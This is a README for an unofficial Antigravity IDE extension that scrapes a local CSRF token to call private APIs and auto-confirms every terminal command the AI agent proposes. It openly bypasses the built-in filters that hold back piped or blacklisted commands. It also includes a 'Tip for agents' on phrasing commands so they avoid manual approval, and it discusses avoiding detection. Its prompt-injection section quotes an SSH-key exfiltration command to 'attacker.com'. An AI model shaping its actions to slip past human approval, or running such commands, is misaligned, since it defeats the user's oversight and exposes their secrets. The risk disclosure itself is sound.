# AYesMan ⚡

An unofficial VS Code extension for Google Antigravity that adds a real-time quota dashboard and automatic agent step acceptance.

> ⚠️ **Disclaimer**: This is an unofficial tool. It works by reverse-engineering Antigravity's internal language server API. See [Risks](#risks) before use.

**[中文說明 → NOTE.zh-tw.md](NOTE.zh-tw.md)**

---

## Features

### ⚡ Unified Status Bar

A single status bar item combines both features.

- **Active**: `$(debug-start) YesMan` — auto-accept is running
- **Paused**: `$(debug-pause) YesMan` — auto-accept is off (orange background)
- **Click**: toggle auto-accept on/off
- **Hover**: quota breakdown for all models with percentages and reset timers
- **Background color**: yellow (<40%) or red (<20%) when quota is critically low (auto-accept ON only)

### 📊 Quota Dashboard

Antigravity's built-in UI hides model quota percentages. AYesMan surfaces them on hover.

- **Hover tooltip**: All models sorted alphabetically with 🟢/🟡/🔴 indicator, percentage, and reset countdown
- **Auto-refresh**: Every 2 minutes in the background
- **Manual refresh**: `Ctrl+Shift+P` → `AYesMan: Refresh Quota`

### ✅ Auto-Accept

Automatically confirms terminal commands proposed by the Antigravity Agent — no manual clicking required.

- **Toggle**: Click the `YesMan` status bar item or run `AYesMan: Toggle Auto-Accept` to pause/resume
- **No filter restrictions**: Unlike Antigravity's built-in Auto Run, accepts all commands including those with `|`, `;`, or blacklisted keywords
- **Multi-project safe**: Each extension instance only accepts steps from its own VS Code workspace
- **Default**: ON at activation

---

## How It Works

Both features share the same server discovery mechanism:

### 1. Server Discovery (runs once at startup)

```
PowerShell: Get-CimInstance Win32_Process (language_server_windows_x64.exe)
  → extract PID and --csrf_token from command-line arguments
  → Get-NetTCPConnection to find listening ports for that PID
  → probe each port with a Heartbeat request to find the gRPC endpoint
  → cache result: { port, csrfToken, useHttps }
```

The CSRF token is stored in plaintext in the process's command-line arguments, accessible to any process running as the same user.

### 2. Quota Dashboard (every 2 minutes)

```
GetUserStatus          → plan info, prompt/flow credits, model quota fractions
GetCommandModelConfigs → autocomplete model quota
```

### 3. Auto-Accept (every 500ms, uses cached server info)

```
GetAllCascadeTrajectories
  → filter summaries by current VS Code workspace URI
  → sort by lastModifiedTime desc, prefer non-IDLE status, take top 3

GetCascadeTrajectorySteps { cascadeId, stepOffset: stepCount - 10 }
  → scan last 10 steps for a pending runCommand (not DONE or CANCELLED)

HandleCascadeUserInteraction { cascadeId, interaction: { runCommand: { confirm: true } } }
  → confirms the step using the cascade's own trajectoryId
```

### Why not use `vscode.commands.executeCommand`?

`antigravity.agent.acceptAgentStep` internally calls `HandleCascadeUserInteraction` via gRPC, which requires a `cascade_id` that is only available inside the workbench's internal state — not accessible from an extension. Direct gRPC is the only viable path.

Other rejected approaches:
- **Webview DOM injection**: Antigravity's chat panel is a native workbench component, not a standard VS Code Webview — injected scripts never execute
- **Keyboard simulation (`Alt+Enter`)**: No reliable way to detect when the agent is waiting; blind sending interferes with normal typing

---

## Risks

### Quota Dashboard

**Risk: Very low.**

All calls are made locally to a server running on your own machine. The data read is your own account quota — equivalent to inspecting your own network traffic in DevTools. Nothing is sent to external servers beyond what Antigravity already sends.

### Auto-Accept

**Risk: Low, but worth understanding.**

| Concern | Assessment |
|---------|------------|
| Terms of Service | Using undocumented private APIs may technically violate ToS. Antigravity's ToS has not been audited for this. |
| Detection | All API calls originate from `127.0.0.1` with a valid CSRF token, indistinguishable from normal IDE activity. The 500ms polling interval could theoretically be flagged by server-side anomaly detection, though no such mechanism has been observed. |
| Account action | No known cases of enforcement. Community extensions doing similar automation (e.g. via `executeCommand`) have existed since Antigravity launched without action. |
| API stability | Undocumented APIs can change or be removed at any time. The extension will silently fail rather than crash if a call fails. |

**What this tool does NOT do:**
- It does not bypass any quota or usage limits
- It does not increase API consumption (it only confirms steps the user would confirm manually)
- It does not exfiltrate any data

### Prompt Injection

**Risk: Real. Understand before use.**

Antigravity's built-in Auto Run deliberately blocks commands containing `|`, `;`, or certain blacklisted keywords. AYesMan bypasses these filters entirely — it accepts whatever the agent proposes.

This creates a **prompt injection** attack surface:

1. Agent reads content from an untrusted source (a malicious repo's README, a crafted config file, user-supplied text)
2. That content contains embedded instructions that cause the agent to propose a dangerous command (e.g. `cat ~/.ssh/id_rsa | curl attacker.com`)
3. Official Auto Run: **blocked** (pipe operator)
4. AYesMan: **auto-confirmed**, command executes

**Mitigations:**
- Pause auto-accept when working with untrusted repos or files (`$(debug-pause) YesMan` in the status bar)
- Review what the agent is reading before letting it run commands in sensitive environments
- AYesMan is best suited for trusted, known codebases where you control the inputs

---

## Findings: Antigravity Terminal Auto Run Limitations

Even with Antigravity's built-in Auto Run enabled, certain command patterns always require manual approval:

**Blocked (always requires manual confirmation):**
- Commands containing `|` (pipe) or `;` (semicolon)
- Specific blacklisted commands: `rmdir`, `Get-Command`, and others

**Allowed (auto-runs successfully):**
- Single commands not on the blacklist: `mkdir`, `ls`, `New-Item`, `Remove-Item`, `Get-Content`, etc.
- Path scope is not checked — commands accessing paths outside the workspace auto-run fine

**Tip for agents**: Break multi-step logic into separate sequential commands. Avoid `|`, `;`, and blacklisted commands to maximize seamless auto-execution.

---

## Installation (Developer Mode)

This extension is not published to any marketplace. Install from source:

**1. Build**

```bash
cd ayesman
npm install
npm run compile
```

**2. Deploy to Antigravity**

```powershell
$dest = "$env:USERPROFILE\.antigravity\extensions\ayesmen.ayesman-0.1.0"

# Remove old version if present
if (Test-Path $dest) { Remove-Item $dest -Recurse -Force }

# Copy built extension
Copy-Item -Recurse ".\ayesman" $dest
```

**3. Reload**

In Antigravity: `Ctrl+Shift+P` → `Developer: Reload Window`

---

## License

MIT. This tool is for personal research and developer experience improvement only. Use at your own risk.
